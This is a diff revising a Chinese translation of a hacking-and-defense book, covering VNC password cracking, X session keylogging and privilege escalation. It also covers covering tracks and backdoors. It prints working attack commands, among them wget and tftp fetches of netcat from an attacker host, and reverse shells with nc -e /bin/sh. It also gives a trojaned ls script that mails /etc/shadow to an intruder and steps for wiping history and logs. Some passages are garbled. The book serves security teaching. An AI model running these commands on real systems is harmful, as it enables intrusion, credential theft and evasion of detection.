-Ettercap 可捕获身份验证期间通过网络发送的 MySQL 哈希值（图 4-1）。此外，由于 MySQL 使用明文机制传输数据，可以使用 Ettercap 或 Ethereal 等网络分析器监控用户会话。
+`Ettercap` 可捕获身份验证期间通过网络发送的 MySQL 哈希值（图 4-1）。此外，由于 MySQL 使用明文机制传输数据，可以使用 `Ettercap` 或 `Ethereal` 等网络分析器监控用户会话。
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_151_0.png)
 
-图 4-1。可以使用 Ethereal 捕获 MySQL 会话。Ethereal 从 http://www.ethereal.com/ 下载。
+图 4-1。可以使用 `Ethereal` 捕获 MySQL 会话。`Ethereal` 从 http://www.ethereal.com/ 下载。
 
 # 封加固 MySQL
 
@@ -3692,6 +3981,7 @@ $vncrack -h 10.0.0.1 -w passwords.txt
 
 ```bash
 $vncrack -C ~/.vnc/passwd
+
 VNC password: test123
 ```
 
@@ -3703,24 +3993,38 @@ VNC password: test123
 
 # 嗅探并破解 VNC 密码
 
-使用 Ettercap 获取服务器挑战和客户端哈希：
+使用 `Ettercap` 获取服务器挑战和客户端哈希：
 
 ```bash
 # aftercap -C -N
 ettercap 0.6.9 (c)
+
 Your IP: 192.168.1.1 with MAC: 00:30:23:C1:00:00 Iface: eth0
+
 Loading plugins... Done.
+
 Building host list for netmask 255.255.255.0, please wait...
+
 Resolving hostnames...
+
 * |=======================================| 100%
+
 Press 'h' for help...
+
 Sniffing (MAC based): ANY ---> ANY
+
 TCP + UDP packets... (default)
+
 Collecting passwords...
+
 10:04:28 192.168.1.1:6612 --> 10.0.0.1:5901 
+
 USER: On display :0
+
 PASS:
+
 Server Challenge: 612b8f9e6dfe71ba27abff79c06
+
 Client 3DES: 4e2568a12e5e7825add6
 ```
 
@@ -3728,9 +4032,13 @@ Client 3DES: 4e2568a12e5e7825add6
 
 ```bash
 $vncrack -v 612b8f9e6dfe71ba27abff79c06 -r 4e2568a12e5e7825add65196 -w passwords.txt
+
 VNCRACK - by Benoit (http://www.phenoit.de/)
+
 Challenge: 612b8f9e6dfe71ba27abff79c16
+
 Response : 4e2568a12e5e7825add65196
+
 Password: test123
 ```
 
@@ -3747,46 +4055,46 @@ VNC 配置错误：可以为 VNC 身份验证设置空密码。许多用户选�
 - TightVNC 身份验证 Cookie 可预测漏洞：`vncserver` 程序本身是一个负责生成 X 服务器身份验证 Cookie 的 Perl 脚本。在 TightVNC 的 `vncserver` 实现中发现的漏洞会导致生成可预测的身份验证 Cookie。这种情况导致攻击者可能预测与远程 VNC 服务器身份验证所需的响应。详见 http://securityfocus.com/bid/6905。
 - TightVNC 重复挑战重放攻击漏洞：VNC 身份验证机制使用挑战响应方案来验证用户。这导致 VNC 客户端每次身份验证时发送不同的密码哈希。TightVNC 软件中发现的漏洞允许网络段上的恶意用户重用之前获取的密码哈希。更多信息请访问 http://securityfocus.com/bid/5296。
 
-
-
-
-
 # 第 4 章：远程攻击 101
 
 ![](img/17cb132e62949dc7f5e0eadf90c71f51_155_0.png)
 
-图 2：通过 xwd 工具捕获的受害者 X 会话
+图 2：通过 `xwd` 工具捕获的受害者 X 会话
 
 `xscan` 命令可记录发布过 `xhost` 命令的远程主机键入：
 
 ```bash
 [bash]$ xscan 10.0.0.1
+
 Scanning hostname 10.0.0.1 ...
+
 Connecting to 10.0.0.1 (10.0.0.1) on port 6000...
+
 Connected.
+
 Host 10.0.0.1 is running X.
+
 Starting keyboard logging of host 10.0.0.1:0.0 to file
+
 KEYLOG10.0.0.1:0.0:...
 ```
 
-该 `xscan` 命令将捕获 10.0.0.1 上用户的所有键入，并记录到文件 KEYLOG10.0.0.1:0.0 中。你可以从 http://packetstormsecurity.org/ 获取 `xscan`。
+该 `xscan` 命令将捕获 10.0.0.1 上用户的所有键入，并记录到文件 `KEYLOG10.0.0.1:0.0` 中。你可以从 http://packetstormsecurity.org/ 获取 `xscan`。
 
 许多其他可用工具可以允许用户利用用户发布 `xhost` 命令以允许来自其他主机的连接的机会。以下是其中一些工具的列表：
 
-- *xwatchwin 实时显示远程用户 X 会话中的任何窗口。* 用户可以从 http://packetstormsecurity.org/ 下载 `xwatchwin` 工具。
+- `xwatchwin` 实时显示远程用户 X 会话中的任何窗口。用户可以从 http://packetstormsecurity.org/ 下载 `xwatchwin` 工具。
 
 ## 102 第一部分：黑客技术与防御
 
-- xremote 允许向远程 X 会话发送鼠标和键盘事件。该工具可以从 http://www.iafo.org/~chakie/xremote/ 下载。
-
-- xkey 记录远程用户 X 会话的键入，类似于 `xscan`。它可以在 http://packetstormsecurity.org/ 找到。
+- `xremote` 允许向远程 X 会话发送鼠标和键盘事件。该工具可以从 http://www.iafo.org/~chakie/xremote/ 下载。
+- `xkey` 记录远程用户 X 会话的键入，类似于 `xscan`。它可以在 http://packetstormsecurity.org/ 找到。
 
 ## 阻止与隧道 X (Block and Tunnel X)
 
 对于运行服务器的用户，建议采取以下措施：
 
 - 在你的防火墙上阻止 6000 到 6063 端口。这将防止外部主机连接到内部 X 服务器。
-
 - 使用 SSH 安全地对 X 进行隧道传输：
   `ssh -X username@remoteserver.somecompanyasexample.com`
 
@@ -3803,6 +4111,8 @@ Web 代理配置错误：Web 代理配置错误可以使用此处描述的方法
 ```bash
 desproxy 10.0.0.1 23 192.168.1.1 8000 2300
 ```
+
+
 
 发布此命令后，如果入侵者向其自己的主机（127.0.0.1）上的 2300 端口建立 telnet 隧道，他或她将通过监听在 8000 端口的漏洞 Web 代理（192.168.1.1）连接到 10.0.0.1 的 telnet 端口（23）。由于受害者主机只会记录来自 Web 代理 IP 地址 192.168.1.1 的入站连接，攻击者将成功绕过代理以对其代理攻击。
 
@@ -3861,7 +4171,7 @@ PGPPine 为 Pine 邮件客户端增加了 PGP 支持。由于对包含命令的�
 
 包括 HTML 在内的多种格式。Nessus 可于 http://www.nessus.org/。
 
-Nessus 设计用于客户端/服务器架构。Nessus 服务器（nessusd）负责对目标主机执行漏洞检查。Nessus 客户端程序（nessus）用于连接到服务器以配置和启动检查。Nessus 客户端与服务器之间的通信是加密的。
+Nessus 设计用于客户端/服务器架构。Nessus 服务器（`nessusd`）负责对目标主机执行漏洞检查。Nessus 客户端程序（`nessus`）用于连接到服务器以配置和启动检查。Nessus 客户端与服务器之间的通信是加密的。
 
 由于 Nessus 的设计非常模块化，编写自己的安全检查很容易。Nessus 安全检查可以使用 C 编程语言或 Nessus 的 NASL（Nessus 脚本语言）编写。有关 NASL 的详情请参见第 10 章。
 
@@ -3869,43 +4179,55 @@ Nessus 设计用于客户端/服务器架构。Nessus 服务器（nessusd）负�
 
 一旦攻击者成功通过在受害者主机上远程执行任意命令来利用远程服务或应用程序，他或她将希望获得一个远程 shell 以继续利用受害者主机。
 
-
-
-
 # 使用 Netcat 获取远程 Shell
 
 可以通过以下步骤获取远程 Shell：
 
 - 1. **上传 Netcat** Netcat 可用于跨越网络发送远程 Shell。首先，你必须将 Netcat 放置在受害者主机上。这可以通过在受害者主机上执行 `tftp` 命令来实现：
+
 ```
 tftp -i attacker_s_ip_address nc
 ```
+
 攻击者必须运行一个可访问的 TFTP 服务器，并将 Netcat 二进制文件放置在 TFTP 目录（通常为 `/tftpboot`）中，以便上述上传操作能够成功。
 除了 TFTP，也可以在受害者机器上执行 `wget` 工具来获取放置在攻击者 Web 服务器上的 Netcat 二进制文件：
+
 ```
 wget http://attacker_s_ip_address/nc
 ```
+
 或者，攻击者可以使用 FTP 命令行客户端将 Netcat 二进制文件上传到受害者主机：
+
 ```
 ftp -n ftpscript
 ```
-其中 ftpscript 是包含以下内容的文本文件：
+
+其中 `ftpscript` 是包含以下内容的文本文件：
+
 ```
 attacker_s_ftp_server_ip_address
+
 user_on_attacker_s_ftp_server user_password
+
 bin
+
 get nc
+
 bye
 ```
-通过在受害者主机上运行以下 echo 命令可以创建 ftpscript：
+
+通过在受害者主机上运行以下 `echo` 命令可以创建 `ftpscript`：
+
 ```
 echo attacker_s_ftp_server_ip_address > ftpscript; echo user_on_attacker_s_ftp_server user_password >> ftpscript; echo bin >> ftpscript; echo get nc >> ftpscript; echo bye >> ftpscript
 ```
 
 - 2. **使用 Netcat** 一旦将 Netcat 放置在受害者机器上，就可以用它监听任意端口并在连接时提供 Shell：
+
 ```
 ./nc -e /bin/sh -l -p 9999
 ```
+
 现在，攻击者只需要连接到受害者的 9999 端口即可接收命令 Shell：
 
 ```
@@ -3924,37 +4246,37 @@ nc -v -n -l -p 9999
 /nc -e /bin/sh attacker's_ip_address 9999
 ```
 
-Netcat 默认未启用 -e 选项，该选项用于建立连接后执行程序。如果你希望它支持 -e 标志，则必须使用 `-DGAPING_SECURITY_HOLE` 标志编译 Netcat。记住在将 Netcat 二进制文件上传到受害者主机之前执行此操作。
+Netcat 默认未启用 `-e` 选项，该选项用于建立连接后执行程序。如果你希望它支持 `-e` 标志，则必须使用 `-DGAPING_SECURITY_HOLE` 标志编译 Netcat。记住在将 Netcat 二进制文件上传到受害者主机之前执行此操作。
 
 # 使用 xterm 获取远程 Shell
 
-如果受害者安装了如 xterm 等 X 终端客户端软件，攻击者可以执行它来接收远程 Shell：
+如果受害者安装了如 `xterm` 等 X 终端客户端软件，攻击者可以执行它来接收远程 Shell：
 
 ```
 xterm -display attacker's_ip_address:0.0 &
 ```
 
-此命令将导致 xterm 实例在受害者主机上执行并显示在攻击者的 X 服务器上。当然，攻击者必须先运行以下命令以允许 xterm 显示在其 X 服务器上：
+此命令将导致 `xterm` 实例在受害者主机上执行并显示在攻击者的 X 服务器上。当然，攻击者必须先运行以下命令以允许 `xterm` 显示在其 X 服务器上：
 
 ```
 xhost +victim's_ip_address
 ```
 
+
+
 以下你可以采取的步骤，以增加入侵者获取远程 Shell 的难度：
 
 - 配置防火墙阻止所有未使用的端口。此外，收紧防火墙规则以限制出站连接。例如，仅作为 Web 服务器的主机不得允许在任何端口上发起出站连接。
-
-- 从生产主机卸载如 telnet、ftp、wget 和 tfftp 等客户端软件。
-
+- 从生产主机卸载如 `telnet`、`ftp`、`wget` 和 `tfftp` 等客户端软件。
 - 从生产主机卸载 X 程序和库。
 
 # 端口重定向
 
-端口重定向技术可绕过弱的防火墙规则，连接到运行在防火墙过滤端口上的服务。为了方便端口重定向，我们将使用 Zebedee，这是一种可以在 http://www.winton.org.uk/zebedee 获取的命令行工具。假设受害者机器上可用 Zebedee。如果没有，则使用早之前“上传 Netcat”部分中描述的方法将 Zebedee 二进制文件上传到受害者主机。
+端口重定向技术可绕过弱的防火墙规则，连接到运行在防火墙过滤端口上的服务。为了方便端口重定向，我们将使用 `Zebedee`，这是一种可以在 `http://www.winton.org.uk/zebedee` 获取的命令行工具。假设受害者机器上可用 `Zebedee`。如果没有，则使用早之前“上传 Netcat”部分中描述的方法将 `Zebedee` 二进制文件上传到受害者主机。
 
-# 本地端口重定向
+## 本地端口重定向
 
-假设入侵者需要连接到已被攻主机上的 MySQL 服务器。如果被攻主机上或其之前有一个防火墙允许 80 端口的入站连接，入侵者可以在受害者机器上执行以下操作：
+假设入侵者需要连接到已被攻主机上的 MySQL 服务器。如果被攻主机上或其之前有一个防火墙允许 `80` 端口的入站连接，入侵者可以在受害者机器上执行以下操作：
 
 ```
 [victimhost]$ zebedee -T 80 -s 127.0.0.1:3306
@@ -3966,32 +4288,26 @@ xhost +victim's_ip_address
 [intruder's_host]$ zebedee -T 80 victim's_ip_address 3306:127.0.0.1:3306
 ```
 
-这将导致入侵者主机上的 Zebedee 进程连接到受害者主机 80 端口上的 Zebedee 进程。入侵者现在连接其主机的 3306 端口 (127.0.0.1)，从而通过 Zebedee 隧道连接到受害者主机的 3306 端口。
+这将导致入侵者主机上的 `Zebedee` 进程连接到受害者主机 `80` 端口上的 `Zebedee` 进程。入侵者现在连接其主机的 `3306` 端口 (`127.0.0.1`)，从而通过 `Zebedee` 隧道连接到受害者主机的 `3306` 端口。
 
-> 入侵者可以在受害者主机上运行 `ifconfig` 和 `route -n` 命令来识别额外的网卡……（此处原文存在大量 OCR 重复错误，已根据逻辑简化处理）。
+> 入侵者可以在受害者主机上运行 `ifconfig` 和 `route -n` 命令来识别额外的网卡……
 
-
-
-
-
-# 第 5 章
-
-# 权限提升
+# 第 5 章 权限提升
 
 - 本章内容：
 - 利用本地信任
 - 组成员关系与错误的文件权限
-- PATH 中的 ":" 
+- `PATH` 中的 `":"`
 - 软件漏洞
 - 总结
 
 ## 利用本地信任
 
-任何漏洞都允许入侵者获得对远程主机的非特权访问。在获得普通用户权限后，入侵者的下一个逻辑步骤是获取 root（超级用户）权限。除了外部入侵者外，恶意用户也可能尝试利用本地漏洞来获取超级用户权限。
+任何漏洞都允许入侵者获得对远程主机的非特权访问。在获得普通用户权限后，入侵者的下一个逻辑步骤是获取 `root`（超级用户）权限。除了外部入侵者外，恶意用户也可能尝试利用本地漏洞来获取超级用户权限。
 
-将权限提升到超级用户权限的行为通常被称为**权限提升**（privilege escalation）。本章描述了具有普通用户权限的个人尝试获取超级用户权限的各种方法。
+将权限提升到超级用户权限的行为通常被称为**权限提升**（`privilege escalation`）。本章描述了具有普通用户权限的个人尝试获取超级用户权限的各种方法。
 
-在大多数情况下，防火墙被配置为限制来自外部主机和网络的访问。回环接口（127.0.0.1）上的流量通常是不受限制的。事实上，过滤回环接口上的流量可能会导致许多应用程序运行异常。本地用户可以利用这一条件为自己有利，尝试扫描、枚举和利用无法从远程访问的服务。因此，一旦攻击者获得了对主机的本地用户访问权限，他或她可能会尝试书中之前章节中描述的所有攻击技术来提升权限。
+在大多数情况下，防火墙被配置为限制来自外部主机和网络的访问。回环接口（`127.0.0.1`）上的流量通常是不受限制的。事实上，过滤回环接口上的流量可能会导致许多应用程序运行异常。本地用户可以利用这一条件为自己有利，尝试扫描、枚举和利用无法从远程访问的服务。因此，一旦攻击者获得了对主机的本地用户访问权限，他或她可能会尝试书中之前章节中描述的所有攻击技术来提升权限。
 
 ## 组成员关系与错误的文件权限
 
@@ -3999,14 +4315,14 @@ xhost +victim's_ip_address
 
 ### 查找组拥有的文件
 
-假设一个入侵者已经获得了本地账户“joe”的访问权限。他或她可以通过执行 `id` 命令发现“joe”所属的所有组：
+假设一个入侵者已经获得了本地账户“`joe`”的访问权限。他或她可以通过执行 `id` 命令发现“`joe`”所属的所有组：
 
 ```bash
 [bash]$ id
 uid=500(joe) gid=500(joe) groups=500(joe),501(proj1)
 ```
 
-在注意到 "joe" 属于 "proj1" 组后，入侵者可以执行以下命令，该命令将列出所有属于 "proj1" 组的文件：
+在注意到 "`joe`" 属于 "`proj1`" 组后，入侵者可以执行以下命令，该命令将列出所有属于 "`proj1`" 组的文件：
 
 ```bash
 $bash$ find / -group proj1 -print 2> /dev/null
@@ -4017,14 +4333,14 @@ $bash$ find / -group proj1 -print 2> /dev/null
 /var/log/proji
 ```
 
-现在，入侵者确切知道“joe”可以访问哪些 "proj1" 文件。这些文件中的 pass.txt 看起来很有趣：
+现在，入侵者确切知道“`joe`”可以访问哪些 "`proj1`" 文件。这些文件中的 `pass.txt` 看起来很有趣：
 
 ```bash
 $bash$ more /var/proj1/pass.txt
 注意，此程序使用系统密码 "r00t3rp455.w." 对 MySQL 数据库进行验证。
 ```
 
-管理员经常重复使用密码。如果害者的 root 密码与上述注中显示的 MySQL 密码相同，入侵者可以通过执行以下命令获得 root 权限：
+管理员经常重复使用密码。如果害者的 `root` 密码与上述注中显示的 MySQL 密码相同，入侵者可以通过执行以下命令获得 `root` 权限：
 
 ```bash
 $bash$ su
@@ -4035,22 +4351,22 @@ uid=0(root) gid=0(root) groups=0(root), 1(bin), 2(daemon), 3(sys), 4 (adm), 6(di
 
 ### 查找 world可读和可写的文件
 
-除了搜索 world可读的文件外，还可能搜索用户可以访问的 world可读文件。例如，以下是您搜索 /etc 目录下存在的所有世界可读文件：
+除了搜索 `world` 可读的文件外，还可能搜索用户可以访问的 `world` 可读文件。例如，以下是您搜索 `/etc` 目录下存在的所有世界可读文件：
 
 ```bash
 $bash$ find /etc -type f -perm -4 -print 2> /dev/null
 ```
 
-/etc 中的许多文件不应该是世界可读的。例如，/etc/shadow 文件包含用户加密后的密码。任何访问此文件的人都可以使用 John the Ripper 等工具通过暴力破解破解用户密码。
+`/etc` 中的许多文件不应该是世界可读的。例如，`/etc/shadow` 文件包含用户加密后的密码。任何访问此文件的人都可以使用 `John the Ripper` 等工具通过暴力破解破解用户密码。
 
-入侵者可以尝试通过执行以下命令搜索 world可写的文件：
+入侵者可以尝试通过执行以下命令搜索 `world` 可写的文件：
 
 ```bash
 $bash$ find / -type f -perm -2 -print 2> /dev/null
 /usr/sbin/in.telnetd
 ```
 
-在这个示例中，入侵者的 “joe” 账户对 in.telnetd 有写权限。受害者主机上的 inetd 或 xinetd 服务会在每次向主机建立入站 telnet 连接时调用 in.telnetd 文件。入侵者可以编辑 in.telnetd 文件并向其中放入以下内容：
+在这个示例中，入侵者的 “`joe`” 账户对 `in.telnetd` 有写权限。受害者主机上的 `inetd` 或 `xinetd` 服务会在每次向主机建立入站 `telnet` 连接时调用 `in.telnetd` 文件。入侵者可以编辑 `in.telnetd` 文件并向其中放入以下内容：
 
 ```bash
 #!/bin/bash
@@ -4058,31 +4374,33 @@ xterm -display intruder’s_ip_address:0.0 &
 ```
 
 现在，入侵者可以在其他或她的宿主机上执行以下操作：
-xhost +victim_s_ip_address
+`xhost +victim_s_ip_address`
 
-这将允许受害者机器在入侵者的服务器上显示 X  程序。入侵者只需要连接到 telnet 主机，这将使 inetd 或 xinetd 以 root 权限调用 /usr/sbin/in.telnetd，从受害者主机调用一个 root xterm 并呈现给入侵者！
+这将允许受害者机器在入侵者的服务器上显示 X 程序。入侵者只需要连接到 `telnet` 主机，这将使 `inetd` 或 `xinetd` 以 `root` 权限调用 `/usr/sbin/in.telnetd`，从受害者主机调用一个 `root` `xterm` 并呈现给入侵者！
 
 ### 确保正确的权限
 
 例行审核文件以确保正确的权限权限。
 
-## PATH 中的 ":"
+## `PATH` 中的 `":"`
 
-当用户执行命令时，命令 shell 会在 PATH 环境变量中包含的目录列表中搜索该命令的位置：
+当用户执行命令时，命令 `shell` 会在 `PATH` 环境变量中包含的目录列表中搜索该命令的位置：
 
 ```bash
 [bash]$ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/home/joe:/bin
 ```
 
-假设 root 用户将当前目录（“.”）放在了他的 PATH 中：
-:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin
 
-现在，每当 root 用户执行如 ls 的命令时，首先会在当前目录中查找“ls”，然后会在 PATH 变量中列出的其他目录中搜索。
+
+假设 `root` 用户将当前目录（“.”）放在了他的 `PATH` 中：
+`:/usr/local/sbin:/usr/local/bin:/usr/bin:/bin`
+
+现在，每当 `root` 用户执行如 `ls` 的命令时，首先会在当前目录中查找“`ls`”，然后会在 `PATH` 变量中列出的其他目录中搜索。
 
 ### 利用 PATH 中的 "." 植入木马
 
-一个拥有本地账户如“joe”访问权限的恶意用户可能在 PATH 中创建一个名为“ls”的文件，并在受害者的家目录（/home/joe）放置以下内容：
+一个拥有本地账户如“joe”访问权限的恶意用户可能在 `PATH` 中创建一个名为“`ls`”的文件，并在受害者的家目录（`/home/joe`）放置以下内容：
 
 Resolving intruder's_server... done.
 Connecting to intruder's_server[10.0.0.1]:80... connected.
@@ -4094,21 +4412,21 @@ HTTP request sent, awaiting response... 200 OK
 
 ### 本地缓冲区溢出
 
-请参考第 4 章介绍缓冲区溢出。本地应用程序和服务也受到缓冲区溢出攻击。例如，“HP-UX IPCS Core文件溢出漏洞”是由文件名检查不当引起的。易受此漏洞影响的 ipcs 程序会被本地用户利用获取 root 权限。
+请参考第 4 章介绍缓冲区溢出。本地应用程序和服务也受到缓冲区溢出攻击。例如，“HP-UX IPCS Core文件溢出漏洞”是由文件名检查不当引起的。易受此漏洞影响的 `ipcs` 程序会被本地用户利用获取 `root` 权限。
 
 ![](img/17cb132e6294dc7f5eead90c71f5)
 
 ## 不正确的输入验证
 
-对接受输入的程序进行输入验证非常重要。Setuid 程序以 root 用户权限执行，因此微小的输入验证漏洞可能允许本地用户以 root 权限执行命令。
+对接受输入的程序进行输入验证非常重要。`Setuid` 程序以 `root` 用户权限执行，因此微小的输入验证漏洞可能允许本地用户以 `root` 权限执行命令。
 
-例如，考虑 runpr 工具，它被发现存在输入验证漏洞。
+例如，考虑 `runpr` 工具，它被发现存在输入验证漏洞。
 
 ## 符号链接
 
-**符号链接**是包含文件路径的特殊文件。当程序尝试访问符号链接时，内核会透明地将进程重定向到符号链接指向的文件。
+`符号链接`是包含文件路径的特殊文件。当程序尝试访问符号链接时，内核会透明地将进程重定向到符号链接指向的文件。
 
-虽然符号链接是一个很有用的功能，但它们可用于利用不检查文件是否为符号链接的程序。例如，CDE Tooltalk 符号链接漏洞，它没有检查写入日志的文件是否为符号链接。攻击者可以创建一个指向 /etc/shadow 的符号链接，其名称和路径与 Tooltalk 创建的日志相同。这将导致 Tooltalk 写入 /etc/shadow，导致其内容损坏。攻击者成功强制将特定内容写入敏感文件，就可以利用这些漏洞获得提升权限。
+虽然符号链接是一个很有用的功能，但它们可用于利用不检查文件是否为符号链接的程序。例如，`CDE Tooltalk` 符号链接漏洞，它没有检查写入日志的文件是否为符号链接。攻击者可以创建一个指向 `/etc/shadow` 的符号链接，其名称和路径与 `Tooltalk` 创建的日志相同。这将导致 `Tooltalk` 写入 `/etc/shadow`，导致其内容损坏。攻击者成功强制将特定内容写入敏感文件，就可以利用这些漏洞获得提升权限。
 
 ## 核心储
 
@@ -4116,27 +4434,28 @@ HTTP request sent, awaiting response... 200 OK
 
 ### Solaris FTP 核心储影子文件恢复漏洞
 
-在旧版本 Solaris 分发的 FTP 服务器已知在当通过以下命令强制崩溃时，会将 /etc/shadow 的部分放在其核心储文件中：
+在旧版本 Solaris 分发的 FTP 服务器已知在当通过以下命令强制崩溃时，会将 `/etc/shadow` 的部分放在其核心储文件中：
 
 ```CWD ~
 ```
 
-使用此命令崩溃 FTP 服务进程后，入侵者可能会获取转储的核心文件，以获取 /etc/shadow 文件的部分。以下是尝试此操作的示例会话：
+使用此命令崩溃 FTP 服务进程后，入侵者可能会获取转储的核心文件，以获取 `/etc/shadow` 文件的部分。以下是尝试此操作的示例会话：
 
 ```bash
 [bash]$ telnet 127.0.0.1 21
+
 Trying 127.0.0.1...
+
 Connected to 127.0.0.1.
+
 Escape character is '^'.
+
 220 127.0.0.1 FTP server (SunOS 5.6) ready
+
 user joe
+
 331 Password required for joe.
 ```
-
-
-
-
-# 118 第一部分：黑客技术与防御
 
 wrongpassword 密码错误
 530 登录错误。
@@ -4146,10 +4465,11 @@ CWD ~
 
 ```bash
 [bash]$ strings /core | grep root
+
 root:$1PykB83bckLZ7CbPhXlnoql:2241:0:9999:7::
 ```
 
-一旦入侵者获得了 root 用户的哈希访问权限，他可以使用 John the Ripper 等工具强制破解密码。请参阅 **securityfocus.com/bid/261** 获取关于 Solaris 漏洞的更多信息。参考第 4 章了解如何使用 John the Ripper 进行密码破解。
+一旦入侵者获得了 `root` 用户的哈希访问权限，他可以使用 `John the Ripper` 等工具强制破解密码。请参阅 `securityfocus.com/bid/261` 获取关于 Solaris 漏洞的更多信息。参考第 4 章了解如何使用 `John the Ripper` 进行密码破解。
 
 ![](img/17cb132e6294dc7f5e0eadf90c1f172_0.png)
 
@@ -4163,7 +4483,7 @@ root:$1PykB83bckLZ7CbPhXlnoql:2241:0:9999:7::
 
 ### 总结
 
-本章介绍了入侵者用于提升权限的技术。你学习了信任本地用户的危险性、文件权限、配置错误以及软件漏洞。一旦入侵者获得了 root 权限，他将拥有完全控制权。入侵者必须隐藏其踪迹，并植入木马以确保持续访问。这些主题将在后续章节讨论。请参考本书的第二部分了解如何进行主机加固，这将有助于防御本章介绍许多权限提升攻击。
+本章介绍了入侵者用于提升权限的技术。你学习了信任本地用户的危险性、文件权限、配置错误以及软件漏洞。一旦入侵者获得了 `root` 权限，他将拥有完全控制权。入侵者必须隐藏其踪迹，并植入木马以确保持续访问。这些主题将在后续章节讨论。请参考本书的第二部分了解如何进行主机加固，这将有助于防御本章介绍许多权限提升攻击。
 
 # 第 6 章：隐藏
 
@@ -4181,10 +4501,11 @@ root:$1PykB83bckLZ7CbPhXlnoql:2241:0:9999:7::
 
 ```bash
 [bash]# rm -rf /root/.bash_history
+
 [bash]# ln -s /dev/null /root/.bash_history
 ```
 
-现在，任何尝试写入 `/root/.bash_history` 的进程将写入 `/dev/null`，这是一个空文件。这将导致 bash 生成的所有历史数据被丢弃。
+现在，任何尝试写入 `/root/.bash_history` 的进程将写入 `/dev/null`，这是一个空文件。这将导致 `bash` 生成的所有历史数据被丢弃。
 
 ### 启用审计和日志
 
@@ -4194,12 +4515,12 @@ root:$1PykB83bckLZ7CbPhXlnoql:2241:0:9999:7::
 
 `/var` 目录通常包含以下文件：
 - `utmp` 和 `wtmp`：包含登录系统的信息。
-- `messages` 和 `secure`：由 syslog 守护进程记录各种应用程序和守护进程提交的日志。
+- `messages` 和 `secure`：由 `syslog` 守护进程记录各种应用程序和守护进程提交的日志。
 - `xferlog`：由 FTP 守护进程记录数据传输请求。
 - `maillog`：由 SMTP 服务器记录邮件传输。
 - `lastlog`：包含最近登录的用户信息。
 
-入侵者可能会手动编辑列出的文件以隐藏其踪迹。通常，入侵者使用 `zap3` 等自动化工具完成此任务。`zap3` 工具可以清理 `utmp`、`wtmp`、`messages`、`secure` 和 `lastlog`。它从 http://www.packetstormsecurity.org/ 获取。此外，入侵者可能会禁用 syslogd 等服务并修改其配置文件（syslog.conf），将日志写入 `/dev/null`。
+入侵者可能会手动编辑列出的文件以隐藏其踪迹。通常，入侵者使用 `zap3` 等自动化工具完成此任务。`zap3` 工具可以清理 `utmp`、`wtmp`、`messages`、`secure` 和 `lastlog`。它从 `http://www.packetstormsecurity.org/` 获取。此外，入侵者可能会禁用 `syslogd` 等服务并修改其配置文件（`syslog.conf`），将日志写入 `/dev/null`。
 
 ### 后门
 
@@ -4207,7 +4528,7 @@ root:$1PykB83bckLZ7CbPhXlnoql:2241:0:9999:7::
 
 ### 安装远程 Shell
 
-入侵者可以在 `inetd.conf` 或 `xinetd` 目录中添加条目，使 `inetd` 或 `xinetd` 在特定端口提供远程 shell。这可以通过配置 `inetd` 或 `xinetd` 执行 `/bin/bash` 或其他命令 shell 来。一旦完成，攻击者可以 telnet 连接到受害端口。
+入侵者可以在 `inetd.conf` 或 `xinetd` 目录中添加条目，使 `inetd` 或 `xinetd` 在特定端口提供远程 shell。这可以通过配置 `inetd` 或 `xinetd` 执行 `/bin/bash` 或其他命令 shell 来。一旦完成，攻击者可以 `telnet` 连接到受害端口。
 
 ```xinetd
 {
@@ -4229,21 +4550,29 @@ root:$1PykB83bckLZ7CbPhXlnoql:2241:0:9999:7::
 
 ```bash
 $ ssh-keygen -t rsa
+
 Generating rsa key pair.
 Enter file in save the key (/home/intruder/.ssh/):
+
 Created directory '/home/intruder/.ssh'.
 Enter passphrase (empty for no passphrase): [enter]
 Enter same passphrase again: [enter]
 Your identification has been saved in /home/intruder/.ssh/id_rsa.
-Your public key has been saved in /home/intruder/.ssh/id_rsa.pub.
-The key fingerprint is:
-38:33:7b:db:05:00:10:62:57:bc:8b:85:05:9a:a9@intrudershost
 ```
+
+
+
+Your public key has been saved in `/home/intruder/.ssh/id_rsa.pub`.
+
+The key fingerprint is:
+
+`38:33:7b:db:05:00:10:62:57:bc:8b:85:05:9a:a9@intrudershost`
 
 现在，入侵者必须将 `.ssh/id_rsa.pub` 的内容复制到受害者主机的 `.ssh/authorized_keys`。完成后，入侵者可以无密码 SSH 登录受害者主机：
 
 ```bash
 $ ssh root@victim’s_address
+
 Last login: Sun Mar 30 02:23:48 2003 from intruder’s_host
 ```
 
@@ -4257,10 +4586,7 @@ PermitRootLogin no
 
 # Loki2
 
-Loki2 是一款免费提供的工具，经常被入侵者用于安装后门。它使用 ICMP_ECHO 和 ICMP_REPLY 数据包来隧道 shell 命令。这使得检测变得极其困难，因为它的数据包看起来就像 ping 工具生成的 ICMP 流量。
-
-
-
+Loki2 是一款免费提供的工具，经常被入侵者用于安装后门。它使用 `ICMP_ECHO` 和 `ICMP_REPLY` 数据包来隧道 shell 命令。这使得检测变得极其困难，因为它的数据包看起来就像 ping 工具生成的 ICMP 流量。
 
 # 126 第 I 部分：攻击技术与防御
 
@@ -4276,19 +4602,21 @@ Loki2 是一款免费提供的工具，经常被入侵者用于安装后门。�
 
 ### 木马化常用命令
 
-入侵者可能会用以下脚本替换 /bin/ls 二进制文件：
+入侵者可能会用以下脚本替换 `/bin/ls` 二进制文件：
 
 ```bash
 #!/bin/bash
+
 cat /etc/shadow | mail intruder@intruders_email
+
 /bin/ls.old
 ```
 
-该脚本会将 /etc/shadow 文件通过电子邮件发送给入侵者。当然，这只有在 root 用户执行它时才会成功。注意，该脚本调用了原始二进制文件（保存为 /ls.old）。这使得受害者难以检测到。此类修改过的二进制文件被称为木马。
+该脚本会将 `/etc/shadow` 文件通过电子邮件发送给入侵者。当然，这只有在 root 用户执行它时才会成功。注意，该脚本调用了原始二进制文件（保存为 `/ls.old`）。这使得受害者难以检测到。此类修改过的二进制文件被称为木马。
 
 这些是最常被入侵者木马化的二进制文件：
 
-arp, cat, chfn, chsh, crontab, du, ifconfig, finger, find, killall, more, locate, login, ls, lsof, passwd, pidof, ps, route, netstat, tail, tcpd, tcpdump, top, w, who, syslog.
+`arp`, `cat`, `chfn`, `chsh`, `crontab`, `du`, `ifconfig`, `finger`, `find`, `killall`, `more`, `locate`, `login`, `ls`, `lsof`, `passwd`, `pidof`, `ps`, `route`, `netstat`, `tail`, `tcpd`, `tcpdump`, `top`, `w`, `who`, `syslog`.
 
